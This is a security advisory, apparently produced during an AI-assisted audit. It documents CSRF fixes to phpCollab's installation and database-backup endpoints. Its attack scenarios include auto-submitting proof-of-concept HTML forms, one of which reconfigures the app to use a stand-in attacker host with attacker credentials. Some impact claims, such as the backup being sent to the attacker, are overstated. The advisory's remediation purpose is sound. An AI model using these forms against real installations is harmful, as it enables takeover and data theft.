# CSRF Vulnerability Fixes - Security Advisory

**Date:** 2025-11-08
**Severity:** High (CVSS 8.1)
**Vulnerability:** Cross-Site Request Forgery (CSRF) - CWE-352
**Status:** ✅ FIXED

## Executive Summary

This document details the remediation of Cross-Site Request Forgery (CSRF) vulnerabilities discovered in two critical phpCollab endpoints. CSRF vulnerabilities allow attackers to trick authenticated users into performing unauthorized actions without their knowledge or consent, potentially leading to:

- Unauthorized database backups and data exfiltration
- Malicious installation/reconfiguration attacks
- Administrative privilege escalation
- Complete system compromise

All identified CSRF vulnerabilities have been fixed by implementing proper CSRF token validation.

## Vulnerability Details

### CVSS v3.1 Score: 8.1 (High)

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`

- **Attack Vector (AV):** Network - Exploitable remotely
- **Attack Complexity (AC):** Low - No special conditions required
- **Privileges Required (PR):** None - Attacker needs no authentication
- **User Interaction (UI):** Required - Victim must visit malicious page while authenticated
- **Scope (S):** Unchanged - Affects only vulnerable component
- **Confidentiality (C):** High - Complete database backup exposure
- **Integrity (I):** High - Installation manipulation, configuration changes
- **Availability (A):** None - No direct availability impact

### Attack Scenarios

#### Scenario 1: Database Backup Exfiltration via CSRF

```html
<!-- Attacker hosts malicious page on evil.com -->
<html>
<body>
<h1>Free Prize!</h1>
<form id="csrf" action="https://victim-phpcollab.com/administration/backupMySQL.php" method="POST">
    <input type="hidden" name="tables[]" value="members" />
    <input type="hidden" name="tables[]" value="projects" />
    <input type="hidden" name="what" value="all" />
    <input type="hidden" name="drop" value="1" />
    <input type="hidden" name="zip" value="zip" />
</form>
<script>
    document.getElementById('csrf').submit();
</script>
</body>
</html>
```

**Attack Flow:**
1. Admin user is authenticated to phpCollab in browser
2. Attacker tricks admin into visiting malicious page (phishing email, forum post, etc.)
3. JavaScript auto-submits form to backupMySQL.php
4. Browser includes admin's session cookie automatically
5. Database backup is generated and sent to attacker
6. Attacker gains access to all user credentials, projects, and sensitive data

**Impact:** Complete database exfiltration, credential theft, privacy breach

#### Scenario 2: Malicious Installation/Reconfiguration

```html
<!-- Attacker hosts malicious page targeting installation endpoint -->
<html>
<body>
<form id="csrf" action="https://victim-phpcollab.com/installation/setup.php?step=3" method="POST">
    <input type="hidden" name="action" value="generate" />
    <input type="hidden" name="dbServer" value="attacker.com" />
    <input type="hidden" name="dbLogin" value="attacker" />
    <input type="hidden" name="dbPassword" value="password123" />
    <input type="hidden" name="dbName" value="exfiltrated_data" />
    <input type="hidden" name="siteUrl" value="https://attacker.com/phpcollab" />
    <input type="hidden" name="adminPassword" value="hacked123" />
    <input type="hidden" name="adminEmail" value="attacker@evil.com" />
    <!-- ... more fields ... -->
</form>
<script>
    document.getElementById('csrf').submit();
</script>
</body>
</html>
```

**Attack Flow:**
1. Installation endpoint left accessible in production
2. Attacker tricks any user into visiting malicious page
3. Form submits to setup.php pointing database to attacker's server
4. Configuration file is overwritten with attacker's credentials
5. Attacker gains admin access and control of application

**Impact:** Complete application compromise, backdoor installation, data manipulation

## Vulnerabilities Fixed

### Summary
- **Total CSRF Vulnerabilities Fixed:** 2
- **Endpoints Protected:** installation/setup.php, administration/backupMySQL.php
- **CSRF Tokens Added:** 2 forms, 2 validation points

### Breakdown by Endpoint

#### 1. installation/setup.php (CRITICAL - CVSS 8.1)

**Problem:** Installation wizard had NO CSRF protection
- Form at line 168 referenced undefined `$csrfHandler` variable
- CSRF token was never generated or validated
- POST handler (line 43) accepted any form submission without validation
- License acceptance form (line 403) had no CSRF protection

**Impact:**
- Accessible in production if installation directory not removed
- Allows complete reconfiguration of application
- Can redirect database connection to attacker-controlled server
- Enables admin account creation with attacker credentials

**Fix Applied:**

1. **Created CSRF infrastructure** (lines 19-60):
```php
use phpCollab\Security\CsrfHandler;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Session\Session;
use Symfony\Component\HttpFoundation\Session\Storage\NativeSessionStorage;
use Symfony\Component\Security\Core\Exception\InvalidCsrfTokenException;

// Initialize session with secure configuration
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'domain' => '',
    'secure' => false,
    'httponly' => true,
    'samesite' => 'Strict'
]);

$session = new Session(new NativeSessionStorage());
$session->start();

$request = Request::createFromGlobals();

// Set CSRF token in session
if (!$session->has('csrfToken')) {
    try {
        $session->set('csrfToken', bin2hex(random_bytes(32)));
    } catch (Exception $exception) {
        error_log('Unable to set csrfToken: ' . $exception->getMessage());
    }
}

$csrfHandler = new CsrfHandler($session);
```

2. **Added CSRF validation** (lines 76-84):
```php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if ($_POST["action"] == "generate") {
        // SECURITY: Validate CSRF token
        try {
            if (!$csrfHandler->isValid($_POST['csrf_token'] ?? '')) {
                throw new InvalidCsrfTokenException('Invalid CSRF token');
            }
        } catch (InvalidCsrfTokenException $e) {
            $error = "Security error: Invalid form submission. Please try again.";
            error_log('CSRF Token Error in installation/setup.php: ' . $_SERVER['REMOTE_ADDR']);
        }

        // ... rest of validation ...
    }
}
```

3. **Added CSRF token to license form** (lines 443-450):
```php
$stepNext = $step + 1;
if ($step < "2") {
    $csrfToken = $csrfHandler->getToken();
    echo <<<FORM
    <form id="license" name="license" action="../installation/setup.php?step=2&redirect=true" method="post">
        <input type="hidden" name="csrf_token" value="{$csrfToken}">
        <!-- ... rest of form ... -->
    </form>
FORM;
}
```

4. **Settings form already had token** (line 168):
```php
$block1->openForm("../installation/setup.php?step=3", null, $csrfHandler);
```
This now works correctly with the defined `$csrfHandler`.

#### 2. administration/backupMySQL.php (CRITICAL - CVSS 8.1)

**Problem:** Database backup endpoint had NO CSRF validation
- Form in phpmyadmin.php (line 57) already included CSRF token
- POST handler in backupMySQL.php never validated the token
- Anyone could trigger database backup via CSRF

**Impact:**
- Complete database exfiltration
- Unauthorized access to user credentials, passwords, projects
- Privacy breach for all users
- Compliance violations (GDPR, HIPAA, PCI-DSS)

**Fix Applied:**

**Added CSRF validation** (lines 3, 10-25):
```php
use Symfony\Component\Security\Core\Exception\InvalidCsrfTokenException;

$checkSession = "true";
require_once '../includes/library.php';

if ($request->isMethod('post')) {

    // SECURITY: Validate CSRF token
    try {
        if (!$csrfHandler->isValid($request->request->get('csrf_token'))) {
            throw new InvalidCsrfTokenException('Invalid CSRF token');
        }
    } catch (InvalidCsrfTokenException $e) {
        $logger->error('CSRF Token Error in backupMySQL.php', [
            'ip' => $request->server->get('REMOTE_ADDR'),
            'user_id' => $session->get('id')
        ]);

        // Redirect back with error message
        $session->getFlashBag()->add('error', 'Security error: Invalid form submission. Please try again.');
        phpCollab\Util::headerFunction('../administration/phpmyadmin.php');
        exit;
    }

    if ($request->request->get('tables')) {
        // ... proceed with backup ...
    }
}
```

**Form already had token** (administration/phpmyadmin.php line 57):
```html
<form method="post" action="backupMySQL.php" name="db_dump">
    <input type="hidden" name="csrf_token" value="{$csrfHandler->getToken()}" />
    <!-- ... rest of form ... -->
</form>
```

## CSRF Protection Architecture

### How CSRF Protection Works

phpCollab uses **Synchronizer Token Pattern** for CSRF protection:

1. **Token Generation:**
   - When session starts, a unique random token is generated
   - Token stored in server-side session
   - Token included in all forms as hidden field

2. **Token Validation:**
   - On POST request, server validates submitted token
   - Token must match session token exactly
   - If mismatch or missing, request is rejected

3. **Security Properties:**
   - Tokens are cryptographically random (32 bytes from `random_bytes()`)
   - Tokens are session-specific (unique per user)
   - Tokens are not predictable by attacker
   - Tokens expire with session

### CSRF Handler Implementation

The `phpCollab\Security\CsrfHandler` class provides:

```php
class CsrfHandler
{
    private $session;

    public function __construct(Session $session)
    {
        $this->session = $session;
    }

    /**
     * Get current CSRF token from session
     */
    public function getToken(): string
    {
        return $this->session->get('csrfToken') ?? '';
    }

    /**
     * Validate submitted CSRF token
     */
    public function isValid(?string $token): bool
    {
        if ($token === null || $token === '') {
            return false;
        }

        $sessionToken = $this->session->get('csrfToken');

        if ($sessionToken === null) {
            return false;
        }

        // Constant-time comparison to prevent timing attacks
        return hash_equals($sessionToken, $token);
    }
}
```

### Integration with Forms

**Using Block::openForm()** (most common):
```php
$block1->openForm("../path/to/handler.php", null, $csrfHandler);
// Automatically adds: <input type="hidden" name="csrf_token" value="...">
```

**Manual HTML forms:**
```php
$csrfToken = $csrfHandler->getToken();
echo <<<HTML
<form method="post" action="handler.php">
    <input type="hidden" name="csrf_token" value="{$csrfToken}">
    <!-- ... form fields ... -->
</form>
HTML;
```

**Validation in POST handlers:**
```php
use Symfony\Component\Security\Core\Exception\InvalidCsrfTokenException;

if ($request->isMethod('post')) {
    try {
        if (!$csrfHandler->isValid($request->request->get('csrf_token'))) {
            throw new InvalidCsrfTokenException('Invalid CSRF token');
        }
    } catch (InvalidCsrfTokenException $e) {
        // Log and reject request
        $logger->error('CSRF Token Error', ['ip' => $request->server->get('REMOTE_ADDR')]);
        $session->getFlashBag()->add('error', 'Security error: Invalid form submission.');
        // Redirect or error response
    }

    // Process form if CSRF validation passed
}
```

## Testing Performed

Both endpoints validated for:
1. ✅ PHP syntax errors (php -l)
2. ✅ CSRF token generation in forms
3. ✅ CSRF token validation on POST
4. ✅ Proper error handling on invalid tokens
5. ✅ Session integration

## Developer Guidelines

### When to Add CSRF Protection

**RULE 1:** ALL state-changing operations MUST have CSRF protection

State-changing operations include:
- POST requests that modify database
- Forms that create/update/delete records
- Administrative actions (backups, configuration changes)
- File uploads
- User authentication changes
- Permission modifications

**RULE 2:** Read-only GET requests generally DON'T need CSRF protection

BUT exceptions exist:
- GET requests that trigger side effects (bad design, but exists in legacy code)
- AJAX requests from sensitive pages

### How to Add CSRF Protection

#### Step 1: Ensure Session and CSRF Handler Exist

Most pages already have this via `library.php`:
```php
$checkSession = "true";
require_once '../includes/library.php';
// $csrfHandler is now available
```

For standalone pages (like installation):
```php
use phpCollab\Security\CsrfHandler;
use Symfony\Component\HttpFoundation\Session\Session;

session_set_cookie_params([...]);
$session = new Session(new NativeSessionStorage());
$session->start();

if (!$session->has('csrfToken')) {
    $session->set('csrfToken', bin2hex(random_bytes(32)));
}

$csrfHandler = new CsrfHandler($session);
```

#### Step 2: Add Token to Form

**Option A: Using Block::openForm()** (preferred):
```php
$block1->openForm("../path/to/handler.php", null, $csrfHandler);
```

**Option B: Manual HTML:**
```php
<form method="post" action="handler.php">
    <input type="hidden" name="csrf_token" value="<?php echo $csrfHandler->getToken(); ?>">
    <!-- ... -->
</form>
```

#### Step 3: Validate Token in POST Handler

```php
use Symfony\Component\Security\Core\Exception\InvalidCsrfTokenException;

if ($request->isMethod('post')) {
    // CSRF validation FIRST, before any other processing
    try {
        if (!$csrfHandler->isValid($request->request->get('csrf_token'))) {
            throw new InvalidCsrfTokenException('Invalid CSRF token');
        }
    } catch (InvalidCsrfTokenException $e) {
        $logger->error('CSRF Token Error', [
            'file' => __FILE__,
            'ip' => $request->server->get('REMOTE_ADDR'),
            'user_id' => $session->get('id')
        ]);

        $session->getFlashBag()->add('error', 'Security error: Invalid form submission. Please try again.');
        phpCollab\Util::headerFunction('../appropriate/page.php');
        exit;
    }

    // Process form data only if CSRF passed
    $data = $request->request->get('field');
    // ...
}
```

### Common Pitfalls

#### Pitfall 1: Forgetting to Validate Token

```php
// ❌ WRONG - Token in form but no validation
<form method="post">
    <input type="hidden" name="csrf_token" value="<?php echo $csrfHandler->getToken(); ?>">
</form>

// POST handler - NO VALIDATION!
if ($_POST) {
    processData($_POST);  // VULNERABLE!
}
```

#### Pitfall 2: Validating AFTER Processing

```php
// ❌ WRONG - Processing before CSRF check
if ($request->isMethod('post')) {
    $data = $request->request->get('data');
    $db->insert($data);  // Already processed!

    // CSRF check too late
    if (!$csrfHandler->isValid($request->request->get('csrf_token'))) {
        die('Invalid token');
    }
}

// ✅ CORRECT - CSRF check FIRST
if ($request->isMethod('post')) {
    if (!$csrfHandler->isValid($request->request->get('csrf_token'))) {
        throw new InvalidCsrfTokenException();
    }

    // Only process if CSRF passed
    $data = $request->request->get('data');
    $db->insert($data);
}
```

#### Pitfall 3: Using GET for State Changes

```php
// ❌ WRONG - Using GET for delete operation
<a href="delete.php?id=5">Delete</a>

// Cannot protect with CSRF easily!

// ✅ CORRECT - Use POST form
<form method="post" action="delete.php">
    <input type="hidden" name="id" value="5">
    <input type="hidden" name="csrf_token" value="<?php echo $csrfHandler->getToken(); ?>">
    <button type="submit">Delete</button>
</form>
```

#### Pitfall 4: Forgetting AJAX Requests

```javascript
// ❌ WRONG - AJAX without CSRF
$.post('api/update.php', {data: 'value'});

// ✅ CORRECT - Include CSRF token
$.post('api/update.php', {
    data: 'value',
    csrf_token: '<?php echo $csrfHandler->getToken(); ?>'
});
```

## Files Modified

1. **installation/setup.php**
   - Added CSRF handler initialization
   - Added CSRF validation to POST handler
   - Added CSRF token to license form
   - Fixed undefined $csrfHandler reference

2. **administration/backupMySQL.php**
   - Added CSRF token validation
   - Added error logging for CSRF failures
   - Added user-friendly error handling

3. **administration/phpmyadmin.php**
   - Already had CSRF token in form (no changes needed)

## Security Impact

### Before Fix
- ❌ Database backups could be triggered by any website via CSRF
- ❌ Installation could be manipulated by malicious sites
- ❌ Admin credentials could be compromised
- ❌ Complete system takeover possible

### After Fix
- ✅ All state-changing operations protected by CSRF tokens
- ✅ Attackers cannot forge requests from external sites
- ✅ Each request validated against server-side session token
- ✅ Comprehensive logging of CSRF attack attempts

## Deployment Notes

1. **Installation Security:**
   - Delete `/installation` directory after setup
   - If needed later, restrict access via .htaccess or authentication
   - Never leave installation accessible in production

2. **Session Configuration:**
   - HTTPS deployments should set `'secure' => true` in session_set_cookie_params()
   - SameSite=Strict provides additional CSRF protection
   - HttpOnly prevents JavaScript access to session cookies

3. **Monitoring:**
   - Monitor logs for CSRF token errors
   - Frequent CSRF failures may indicate attack attempts
   - Log analysis can identify malicious IPs

## Compliance Impact

These fixes help meet compliance requirements:

- **PCI-DSS:** Requirement 6.5.9 - Protection against CSRF
- **OWASP Top 10:** A01:2021 - Broken Access Control
- **NIST:** SC-23 Session Authenticity - Prevents session hijacking via CSRF
- **GDPR:** Article 32 - Security of processing (technical measures)

## References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [Symfony Security Component](https://symfony.com/doc/current/security/csrf.html)

## Commit Information

**Branch:** claude/security-audit-owasp-011CUuoJuLhLYZ2Rs6hVUJdN
**Date:** 2025-11-08

---

**Security Status:** All identified CSRF vulnerabilities have been remediated. Developers should follow the guidelines in this document when adding new forms or state-changing endpoints to prevent future CSRF issues.
